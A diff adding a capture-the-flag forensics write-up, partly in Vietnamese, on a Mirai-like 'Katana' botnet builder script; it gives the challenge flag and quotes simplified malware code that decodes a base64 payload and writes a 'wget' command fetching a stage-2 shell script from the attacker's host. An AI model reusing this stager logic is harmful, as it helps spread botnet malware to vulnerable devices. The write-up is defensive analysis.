@@ -1,0 +1,42 @@
+# 🛡️ Katana Botnet Forensics Write-up
+**Category:** Forensics / Malware Analysis  
+**Malware Family:** Mirai-like / Katana  
+**Author:** monkey1112004  
+
+---
+
+## 📌 Executive Summary
+
+- **Flag / IoC:** `CHH{Mirai_aka_Katana_b0tn3t}`
+- **Malware type:** Botnet builder / stager
+- **Key finding:**  
+  `payload.py` **không phải bot binary**, mà là **builder** sinh payload động dựa trên **IP public của attacker**, tải stage-2 từ **Pastebin**.
+- **Stage-2** đã bị xóa, nhưng **được khôi phục bằng Wayback Machine** → tìm ra flag & hành vi backdoor.
+
+---
+
+## 🎯 Objectives
+
+- Phân tích **cấu trúc & hành vi** của `payload.py`
+- Trình bày **tư duy forensic an toàn** (không thực thi malware)
+- Truy vết **C2 / Stage-2 / IoC**
+- Giải thích **botnet workflow** & kỹ thuật attacker sử dụng
+- Đưa ra **checklist phân tích & detection ideas**
+
+---
+
+## 🧩 Sample Overview: `payload.py`
+
+### Core logic (simplified)
+
+```python
+ip = urllib.urlopen('http://api.ipify.org').read()
+
+archs = ["x86.yakuza", "mips.yakuza", ...]
+encoded = "Y2QgL3RtcDsg..."
+
+exploit = base64.b64decode(encoded)
+exploitmake(exploit)
+
+complete_payload = "wget http://" + ip + "/yakuza.sh; ..."
+open("payload.txt", "w+").write(complete_payload)
